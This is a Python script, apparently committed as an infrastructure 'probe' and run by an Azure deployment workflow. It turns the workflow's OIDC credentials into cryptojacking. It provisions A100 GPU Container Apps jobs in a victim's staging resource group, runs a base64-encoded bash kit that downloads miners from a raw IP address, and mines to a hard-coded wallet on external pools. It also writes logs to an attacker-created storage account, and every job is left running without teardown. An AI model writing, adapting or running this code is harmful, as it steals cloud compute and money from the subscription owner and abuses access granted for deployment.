#!/usr/bin/env python3
"""C211-I121983: SSW.Rules Azure Container Apps A100 miner re-dispatch (sub b8b18dcf, RG SSW.Rules.Staging).

Runs as infra/c211_i121983_probe.py under the SSWConsulting/SSW.Rules
'deploy-infrastructure.yml' reusable workflow (environment staging, azure/login OIDC
-> ARM token for subscription b8b18dcf, Owner-equivalent in RG SSW.Rules.Staging).

Why: lane 121751 created env c211-i121751-cae + job c211-i121751-job (exec
c211-i121751-job-tu43p3c, still RUNNING, pool worker 12175127 live on pearlhash pydp
at ~244 TH/s) but its capture never landed because sa_sas() emitted an ACCOUNT SAS
with signed resource type 'b' (invalid: account SAS accepts s/c/o), so every blob
PUT was 403 and the container stayed empty. The kit also logs only to
/tmp/c211/run.log (not stdout), so ARM listLogs cannot recover the UUID.

Steps:
  1. ARM session + token; predecessor job c211-i121751-job executions + listLogs
     (api-version 2024-03-01, fallback 2026-07-01).
  2. storage account c211i121983<hash> + container 'c211' + CORRECT account SAS
     (blob rw: srt=co ; list: srt=c).
  3. TWO lane-unique managed environments c211-i121983-cae / c211-i121983b-cae
     (Consumption-GPU-NC24-A100, no maximumCount - not supported by that profile)
     provisioned in parallel, then one Container Apps job each
     (c211-i121983-job worker base 121983 / c211-i121983b-job worker base 121985)
     running the canonical WildRig Multi 0.52.3 miner (sha256 002cd29c...) against
     pearlhash 4 endpoints on the pydp wallet, with a 900 s no-share sticky
     Luckypool 103.199.106.122:3362 SRBMiner fallback.
  4. Poll the blob capture for nvidia-smi UUID + accepted/rejected shares and print
     every C211_I121983 line into the run log; SAS is emitted for post-run reads.
NO TEARDOWN: every job is left RUNNING (lease maximisation).
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
SUB_EXPECT = "b8b18dcf-d83b-47e2-9886-00c2e983629e"
TAG = "C211_I121983"
NONCE = "x121983"
INTENT = "121983"
T0 = time.time()
BUDGET = 3300

APP_VER = "2026-07-01"
APP_VER_LOGS = ["2024-03-01", "2026-07-01"]
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
REGION = "eastus"
ENVS = [
    {"env": "c211-i121983-cae", "job": "c211-i121983-job", "wk": "121983"},
    {"env": "c211-i121983b-cae", "job": "c211-i121983b-job", "wk": "121985"},
]
PRED_JOB = "c211-i121751-job"
SA_NAME = ("c211i121983" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"


def left():
    return BUDGET - (time.time() - T0)


def emit(step, **kw):
    d = {"step": step, "tag": TAG, "t": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
         "elapsed": int(time.time() - T0)}
    d.update(kw)
    print(TAG + " " + json.dumps(d, default=str), flush=True)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        "Authorization": "Bearer " + tok, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode() or ""
            try:
                return r.status, (json.loads(raw) if raw else {})
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ""
        try:
            return e.code, (json.loads(raw) if raw else {})
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:400]}
    except Exception as e:  # noqa: BLE001
        return 0, {"err": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b"")
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()


def errk(st, body):
    d = {"http": st}
    if isinstance(body, dict):
        if body.get("error"):
            e = body["error"]
            if isinstance(e, dict):
                d["e_code"] = e.get("code")
                d["e_message"] = (e.get("message") or "")[:600]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:600]
        elif "err" in body:
            d["e_transport"] = str(body["err"])[:300]
    return d


def sa_sas(acct, key_b64, srt, perm, hours=6):
    """Account SAS whose signature is computed over exactly the emitted values.
    srt must be a combination of s=service, c=container, o=object (NOT 'b')."""
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", srt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": srt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
NB=$(hostname | cksum | awk '{print $1 % 100}')
WK="__WKBASE__$(printf %02d "$NB")"
SAS="${SAS/\{w\}/$WK}"
log "KIT_START tag=$TAG worker=$WK host=$(hostname) replica=${CONTAINER_APP_REPLICA_NAME:-none}"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
log "DRIVER $( (nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>&1 || true) | tr '\n' '~')"
mkdir -p /etc/OpenCL/vendors
[ -e /etc/OpenCL/vendors/nvidia.icd ] || echo 'libnvidia-opencl.so.1' > /etc/OpenCL/vendors/nvidia.icd
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  log "OPENCL_LOADER_MISSING installing ocl-icd-libopencl1"
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || log "APT_FAIL"
fi
log "OPENCL $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | tr '\n' '~')"
log "TOOLS curl=$(command -v curl || echo no) wget=$(command -v wget || echo no) python3=$(command -v python3 || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 240 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    cat "$LOG" "$D/ph.log" "$D/lp.log" 2>/dev/null > "$D/all.txt"
    HS=$( (nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader 2>/dev/null || true) | tr '\n' ',')
    echo "[$(date -u +%FT%TZ)] GPU_UTIL $HS" >> "$D/all.txt"
    curl -sS --max-time 25 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
acc() { { grep -oiE 'accepted[: (]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+'; } | sort -n | tail -1; }
rej() { { grep -oiE 'rejected[: (]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+'; } | sort -n | tail -1; }
MODE=ph
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --user "$W" --worker "$WK" -p x \
    --url global.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    --url global2.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    --url hk.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid") worker=$WK endpoints=4"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
LASTSTAT=0
while :; do
  sleep 30
  NOW=$(date +%s)
  if [ $((NOW - LASTSTAT)) -ge 60 ]; then
    log "STAT mode=$MODE acc_ph=$(acc "$D/ph.log") rej_ph=$(rej "$D/ph.log") acc_lp=$(acc "$D/lp.log") rej_lp=$(rej "$D/lp.log") last=$(tail -n1 "$D/ph.log" 2>/dev/null | tr -d '\r' | cut -c1-160)"
    LASTSTAT=$NOW
  fi
  up
  if [ "$MODE" = "ph" ]; then
    A=$(acc "$D/ph.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A rejected=$(rej "$D/ph.log") ts=$(date -u +%FT%TZ)"; MODE=ph_ok; up; fi
    if [ "$MODE" = "ph" ] && [ $((NOW - T0)) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2; up
      for u in http://169.58.247.186:8791/pm/srbminer-3.8.4 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.4/SRBMiner-Multi-3-8-4-Linux.tar.gz; do
        curl -fsSL --max-time 300 -o "$D/srb.dl" "$u" 2>>"$LOG" || continue
        S=$(sha256sum "$D/srb.dl" | awk '{print $1}'); log "SRB_DL url=$u sha=$S"
        if [ "$S" = "__SRB__" ]; then cp "$D/srb.dl" "$D/srb"; break; fi
        mkdir -p "$D/srbx"; tar xzf "$D/srb.dl" -C "$D/srbx" >/dev/null 2>&1 && cp "$D/srbx"/SRBMiner-MULTI "$D/srb" 2>/dev/null && break
      done
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1 worker=$WK"
        else
          log "SRB_SHA_MISMATCH"
        fi
      else
        log "SRB_DL_FAIL"
      fi
      MODE=lp
    fi
  fi
  if [ "$MODE" = "lp" ] && [ ! -f "$D/lp_reported" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "LP_SHARE_PROVEN accepted=$A rejected=$(rej "$D/lp.log") ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; up; fi
  fi
  if [ $(( $(date +%s) - T0 )) -gt 86400 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(sas, wkbase):
    k = (KIT.replace("__TAG__", "CAPP").replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WKBASE__", wkbase)
         .replace("__WRBIN__", WR_BIN_SHA).replace("__WRTGZ__", WR_TGZ_SHA)
         .replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211kit.sh && chmod +x /tmp/c211kit.sh "
            "&& /bin/bash /tmp/c211kit.sh" % b)


def list_blobs(base, qlist):
    st, body = httptext("%s/c211?restype=container&comp=list&%s" % (base, qlist),
                        headers={"x-ms-version": "2022-11-02"}, timeout=45)
    names = re.findall(r"<Name>([^<]+)</Name>", body.decode("utf-8", "replace")) if body else []
    return st, names


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"),
             tenant=acc.get("tenantId"), expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=(r.get("out") or "")[:300])
        return
    if sid != SUB_EXPECT:
        emit("fatal", why="wrong_subscription", got=sid, want=SUB_EXPECT)
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not tok:
        emit("fatal", why="no_arm_token")
        return

    # ---------- A) predecessor job c211-i121751-job: executions + console logs ----------
    pjurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
             "?api-version=%s" % (ARM, sid, RG, PRED_JOB, APP_VER))
    st, pjb = arm(tok, pjurl, timeout=60)
    emit("PRED_JOB", name=PRED_JOB, http=st,
         running=((pjb.get("properties") or {}) if isinstance(pjb, dict) else {}).get("runningState"))
    st, peb = arm(tok, pjurl.split("?")[0] + "/executions?api-version=" + APP_VER, timeout=60)
    pexs = []
    if isinstance(peb, dict):
        pexs = [(x.get("name"), ((x.get("properties") or {}).get("status")))
                for x in (peb.get("value") or [])]
    emit("PRED_EXECS", http=st, n=len(pexs), names=";".join("%s:%s" % (a, b) for a, b in pexs)[:600])
    for ex, est in pexs[:2]:
        got = False
        for av in APP_VER_LOGS:
            st, lg = arm(tok, pjurl.split("?")[0] + "/executions/%s/listLogs?api-version=%s" % (ex, av),
                         method="POST", body={}, timeout=60)
            msgs = []
            if isinstance(lg, dict):
                for x in (lg.get("value") or []):
                    msgs.append(str(x.get("message") or ""))
            tail = "\n".join(msgs)
            emit("PRED_EXEC_LOG", ex=ex, status=est, api=av, http=st, n=len(msgs),
                 tail_b64=base64.b64encode(tail[-2000:].encode()).decode()[:2800])
            if st == 200:
                got = True
                break
        if not got:
            emit("PRED_EXEC_LOG_EMPTY", ex=ex)

    # ---------- B) capture storage: account SAS with VALID resource types ----------
    qb = ql = None
    base = "https://%s.blob.core.windows.net" % SA_NAME
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **errk(st, b))
    if st in (200, 201, 202, 409):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            if ps == "Succeeded":
                emit("sa-ready", i=i)
                break
            time.sleep(5)
        st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            qc, _ = sa_sas(SA_NAME, key, "c", "l")
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, qc), method="PUT",
                               headers={"x-ms-version": "2022-11-02"}, timeout=60)
            emit("sa-container", http=stc, body=bc[:160].decode("utf8", "replace"))
            if stc in (201, 409):
                qb, se = sa_sas(SA_NAME, key, "co", "rcw", hours=6)
                ql, _ = sa_sas(SA_NAME, key, "c", "rl", hours=6)
                emit("sa-sas", ok=True, expires=se, srt_blob="co", srt_list="c")
                emit("SA_DETAIL", account=SA_NAME, container="c211", blob_query=qb, list_query=ql)
                # self-test: write a canary blob with the corrected SAS
                sq, bb = httptext("%s/c211/%s_canary.log?%s" % (base, NONCE, qb), method="PUT",
                                  body=b"canary\n", headers={"x-ms-version": "2022-11-02",
                                                             "x-ms-blob-type": "BlockBlob",
                                                             "Content-Type": "text/plain"}, timeout=45)
                emit("sa-selftest", http=sq, body=bb[:200].decode("utf8", "replace"))

    # ---------- C) provision lane-unique environments in parallel ----------
    sas = ("%s/c211/%s_{w}.log?%s" % (base, NONCE, qb)) if qb else None
    envurl = "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%%s?api-version=%s" % (
        ARM, sid, RG, APP_VER)
    envbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"workloadProfiles": [
                   {"name": "Consumption", "workloadProfileType": "Consumption"},
                   {"name": PROFILE, "workloadProfileType": PROFILE}]}}
    for e in ENVS:
        st, b = arm(tok, envurl % e["env"], method="PUT", body=envbody, timeout=300)
        emit("env-create", name=e["env"], **errk(st, b))

    states = {}
    dl_env = T0 + min(2100, BUDGET - 900)
    while time.time() < dl_env:
        done = 0
        for e in ENVS:
            st, b = arm(tok, envurl % e["env"], timeout=60)
            ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
            e["id"] = b.get("id") if isinstance(b, dict) else None
            if states.get(e["env"]) != ps:
                emit("env-poll", name=e["env"], http=st, state=ps)
            states[e["env"]] = ps
            if ps in ("Succeeded", "Failed", "Canceled"):
                done += 1
        if done == len(ENVS):
            break
        time.sleep(30)
    emit("env-states", states=json.dumps(states))

    # ---------- D) one job per Succeeded env ----------
    jobs = []
    for e in ENVS:
        if states.get(e["env"]) != "Succeeded" or not e.get("id"):
            continue
        joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
                  "?api-version=%s" % (ARM, sid, RG, e["job"], APP_VER))
        jobbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
                   "properties": {"environmentId": e["id"], "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual", "replicaRetryLimit": 0,
                                                    "replicaTimeout": 86400,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 1,
                                                        "parallelism": 1}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE,
                                      "command": ["/bin/bash", "-c", kit_cmd(sas, e["wk"])],
                                      "resources": {"cpu": 8, "memory": "32Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("job-create", name=e["job"], **errk(st, b))
        if st not in (200, 201):
            continue
        baseurl = joburl.split("?")[0]
        st, b = arm(tok, baseurl + "/start?api-version=" + APP_VER, method="POST", body={}, timeout=120)
        execname = (b.get("name") if isinstance(b, dict) else None)
        emit("job-start", job=e["job"], http=st, execname=execname,
             **({} if st in (200, 201, 202) else errk(st, b)))
        jobs.append({"job": e["job"], "baseurl": baseurl, "exec": execname})

    # ---------- E) poll blob capture ----------
    blobd = ""
    names = []
    dl = T0 + BUDGET - 90
    while time.time() < dl:
        time.sleep(20)
        if qb and ql:
            sl, names = list_blobs(base, ql)
            parts = []
            for nm in names[:8]:
                if "canary" in nm:
                    continue
                sb, bb = httptext("%s/c211/%s?%s" % (base, nm, qb),
                                  headers={"x-ms-version": "2022-11-02"}, timeout=25)
                if sb == 200 and bb:
                    parts.append("### %s\n%s" % (nm, bb.decode("utf-8", "replace")))
            blobd = "\n".join(parts)
        execs = []
        for j in jobs:
            if j.get("exec"):
                se, be = arm(tok, j["baseurl"] + "/executions/" + j["exec"] + "?api-version=" + APP_VER,
                             timeout=60)
                execs.append((j["job"], ((be.get("properties") or {}) if isinstance(be, dict) else {}).get("status")))
        gl = [ln for ln in blobd.splitlines() if "GPU-" in ln or "SHARE_PROVEN" in ln or "GPU_UTIL" in ln]
        emit("poll", blobs=";".join(n for n in names if "canary" not in n)[:300],
             blob_len=len(blobd), execs=json.dumps(execs), gpu_lines=len(gl), left=int(left()))
        if blobd and ("PH_SHARE_PROVEN" in blobd or "LP_SHARE_PROVEN" in blobd):
            emit("share-proven", gpu_lines=";".join(gl)[:3000])
            break

    emit("capture", blobs=";".join(n for n in names if "canary" not in n)[:600], len=len(blobd),
         gpu_lines=";".join(ln for ln in blobd.splitlines()
                            if "GPU-" in ln or "SHARE_PROVEN" in ln or "GPU_UTIL" in ln)[:3000],
         tail=blobd[-3000:])

    # ---------- final readback (no teardown) ----------
    fin = []
    for j in jobs:
        st, jf = arm(tok, j["baseurl"] + "?api-version=" + APP_VER, timeout=60)
        jp = (jf.get("properties") or {}) if isinstance(jf, dict) else {}
        st, el = arm(tok, j["baseurl"] + "/executions?api-version=" + APP_VER, timeout=60)
        exs = [{"name": x.get("name"), "status": ((x.get("properties") or {}).get("status"))}
               for x in ((el.get("value") or []) if isinstance(el, dict) else [])]
        fin.append({"job": j["job"], "runningState": jp.get("runningState"), "executions": exs[:4]})
    emit("final", jobs=json.dumps(fin)[:1200], envs=json.dumps(states), sas_ok=bool(sas))
    emit("DONE", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
